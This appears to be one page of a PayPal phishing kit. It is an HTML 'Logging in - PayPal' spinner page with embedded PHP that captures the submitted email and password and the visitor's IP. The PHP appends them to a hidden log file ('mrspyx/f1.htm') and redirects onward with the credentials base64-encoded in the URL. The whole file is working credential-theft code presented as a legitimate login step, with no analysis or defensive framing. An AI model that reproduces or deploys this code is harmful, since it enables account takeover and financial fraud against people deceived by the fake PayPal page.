                                <html>
<head>
<title>Logging in - PayPal</title>
<link href="css/new.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="img/favicon.ico">
<style>

					#animation {
						display: block;
						margin: 32px auto;
						height:30px;
						width:30px;
						-webkit-animation: rotation .7s infinite linear;
						-moz-animation: rotation .7s infinite linear;
						-o-animation: rotation .7s infinite linear;
						animation: rotation .7s infinite linear;
						border-left:8px solid rgba(0,0,0,.20);
						border-right:8px solid rgba(0,0,0,.20);
						border-bottom:8px solid rgba(0,0,0,.20);
						border-top:8px solid rgba(33,128,192,1);
						border-radius:100%;
					}
					@keyframes rotation {
						from {transform: rotate(0deg);}
						to {transform: rotate(359deg);}
					}
					@-webkit-keyframes rotation {
						from {-webkit-transform: rotate(0deg);}
						to {-webkit-transform: rotate(359deg);}
					}
					@-moz-keyframes rotation {
						from {-moz-transform: rotate(0deg);}
						to {-moz-transform: rotate(359deg);}
					}
					@-o-keyframes rotation {
						from {-o-transform: rotate(0deg);}
						to {-o-transform: rotate(359deg);}
					}
					h3 {font-size:1.4em; margin:4em 0 0 0; line-height:normal;}
					p.note {color:#656565; font-size:1.2em;}
					p.note a {color:#656565;}
					p strong {margin-top:2em; color:#1A3665; font-size:1.25em;}
					img.actionImage {margin:2em auto;}
</style>
</head>

<center>
<div class="onemoment"></div></center>
<div id="animation"></div>

</html>
<?

$USR = $_POST['1'];
$PWD = $_POST['2'];
$IP = getenv("REMOTE_ADDR");



$BILSMG = "<pre><font style='font-size:14px;font-weight: bold;'>
###################################################
                    <img src='http://www.communityenergyclub.org.uk/wp-content/uploads/2013/09/signup-icon.png'/>
###################################################
email    : $USR
password : $PWD
###################################################
IP : <a target='_blank' style='text-decoration:none;' href='http://www.geoiptool.com/?IP=".$IP."'>".$IP."</a>
###################################################";

$file = fopen("../mrspyx/f1.htm","a");
fwrite($file,$BILSMG);
fclose($file);

$USRB = base64_encode($USR);
$PWDB = base64_encode($PWD);

echo "<META HTTP-EQUIV='refresh' content='3; URL=websc-limited.php?Go=_Reason=Limited&_SESSION=$PWDB&_Email=$USRB'>";exit;
?>
                            